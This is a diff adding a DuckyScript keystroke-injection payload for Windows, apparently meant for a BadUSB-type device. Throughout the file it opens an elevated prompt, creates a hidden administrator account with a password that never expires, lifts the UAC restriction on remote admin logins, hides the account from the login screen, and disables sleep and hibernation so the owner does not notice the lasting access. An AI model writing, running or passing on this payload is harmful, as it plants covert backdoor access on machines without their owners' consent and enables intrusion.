@@ -1,0 +1,47 @@
+REM Title: Admin who never sleeps
+REM Desc: Adds a local hidden admin user and sets power settings to never sleep.
+REM Author: UberGuidoZ
+REM Target: Windows (local admin required)
+
+REM Launch admin-level CMD prompt
+DELAY 3000
+GUI r
+DELAY 1000
+STRING cmd
+DELAY 500
+CTRL-SHIFT ENTER
+DELAY 1000
+LEFTARROW
+DELAY 250
+ENTER
+DELAY 1500
+
+REM Create local admin user WinSystem with pass Some-P@ssw0rd
+STRING net user WinSystem Some-P@ssw0rd /add /fullname:"Windows System" /passwordchg:no && net localgroup administrators WinSystem /add
+ENTER
+DELAY 1500
+
+REM Set WinSystem user pass to never expire, skip UAC, and hide the user
+STRING wmic useraccount where name='WinSystem' set passwordexpires=false && REG ADD "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" /f /v LocalAccountTokenFilterPolicy /t REG_DWORD /d 1 && REG ADD "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\SpecialAccounts\UserList" /f /v WinSystem /t REG_DWORD /d 0
+ENTER
+DELAY 1500
+
+REM Change power settings to avoid loss of access later (Hibernation, Standby, Disk Timeout)
+
+STRING powercfg -h off && powercfg /x -hibernate-timeout-ac 0 && powercfg /x -hibernate-timeout-dc 0
+ENTER
+DELAY 1000
+STRING Powercfg /x -standby-timeout-ac 0 && powercfg /x -standby-timeout-dc 0
+ENTER
+DELAY 1000
+STRING powercfg /x -disk-timeout-ac 0 && powercfg /x -disk-timeout-dc 0
+ENTER
+DELAY 1000
+
+REM Set monitor timeouts to avoid noticing system is awake
+STRING powercfg /x -monitor-timeout-ac 10 && powercfg /x -monitor-timeout-dc 10
+ENTER
+DELAY 1000
+
+REM Exit and enjoy your user whenever!
+EXIT
